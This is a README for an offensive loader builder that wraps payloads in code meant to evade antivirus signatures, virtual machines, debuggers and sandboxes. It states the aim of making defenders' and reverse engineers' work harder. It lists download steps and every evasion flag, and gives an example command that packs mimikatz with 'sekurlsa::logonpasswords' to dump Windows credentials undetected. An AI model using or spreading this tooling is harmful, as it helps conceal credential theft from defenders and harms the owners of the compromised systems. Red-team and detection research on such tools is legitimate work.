# RibeyeSpecial
medium-rare
## Purpose
To be a builder that can generate undetected payload on the fly with codes that can be modified to avoid signature detection. Comes with a ton of features that is meant solely to make the blue team life harder as well as make reverse life miserable. 

A loader builder for TheWover's Donut Project. Will support all sort of stuff and have more features as time goes on!
https://twitter.com/specialhoang

https://twitter.com/tomahawkapt69 (At least I remember to clout the group unlike a certain coconut https://twitter.com/nixbyte/status/1189288814465998848)

## Install
1. Download latest https://github.com/apt69/RibeyeSpecial/releases
2. Make sure RibeyeSpecial.exe, RibeyeBone64.exe, and RibeyeBone32.exe are in the same folder

## Usage
### Example
```
C:\Users\APT69\Desktop>RibeyeSpecial.exe -f mimikatz.exe -o test.exe -p -s -t 6000 -g "sekurlsa::logonpasswords"
```
```
C:\Users\APT69\Desktop>RibeyeSpecial.exe -h

USAGE:

   RibeyeSpecial.exe  [-c] [-r] [-d] [-a] [-m] [-p] [-s] [-v] [-e] [-g
                      <string>] [-t <integer>] -o <string> -f <string> [--]
                      [--version] [-h]


Where:

   -c,  --core
     Check CPU core count, anti VM

   -r,  --ram
     Check RAM size, anti VM

   -d,  --debugger
     Check if we are being debugged, anti debug

   -a,  --accel
     Check if sleep is being accelerated, evade sandbox

   -m,  --mouse
     Check mouse movement, evade sandbox

   -p,  --prime
     Prime calculation to evade sandbox

   -s,  --sleep
     Sleep to evade sandbox

   -v,  --vm
     Detect VM using CPUID

   -e,  --all
     Enable all checks with default values

   -g <string>,  --param <string>
     Parameter to pass to payload

   -t <integer>,  --sleeptime <integer>
     How long to sleep for (in ms) if -s is enabled

   -o <string>,  --output <string>
     (required)  Output file name

   -f <string>,  --file <string>
     (required)  Path to file to execute

   --,  --ignore_rest
     Ignores the rest of the labeled arguments following this flag.

   --version
     Displays version information and exits.

   -h,  --help
     Displays usage information and exits.


   Shoutout to APT69 and the brothers that are in it.
   https://twitter.com/TomahawkApt69
```
